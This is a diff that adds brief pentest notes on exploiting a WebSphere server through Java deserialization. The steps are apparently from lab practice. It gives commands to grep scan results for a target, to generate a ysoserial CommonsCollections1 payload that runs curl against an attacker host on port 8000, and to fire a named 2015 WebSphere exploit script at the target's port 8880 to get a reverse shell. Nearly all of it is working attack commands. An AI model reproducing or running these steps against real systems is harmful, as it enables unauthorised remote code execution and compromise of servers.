@@ -1,0 +1,15 @@
+Websphere Java Exploits :
+
+1. identify vulnerabilties on a server
+    grep -i 192.168.x.150 portscan_result_tcp_full.gnmap|tr "," "\n"
+2. use ysoserial is a collection of utilities and property-oriented programming "gadget chains" discovered in common java libraries that can,
+    under the right conditions, exploit Java applications performing unsafe deserialization of objects.
+3. create 2 payloads to exploit the vulnerability
+    3.1 Verifying the vulnerability
+        3.1.1 Generate a test payload ( on kali machine )
+            cd /root/Tools/deserialization-exploit/
+            java -jar ysoserial-all.jar CommonsCollections1 'curl http://192.168.X.206:8000/testpayload.xml' > payload_test
+
+    3.2 Execute the payload ( reserve shell on the target machine )
+        sh websphere-2015-deserialization-exploit.sh https://192.168.x.150:8880/ payload_test
+        
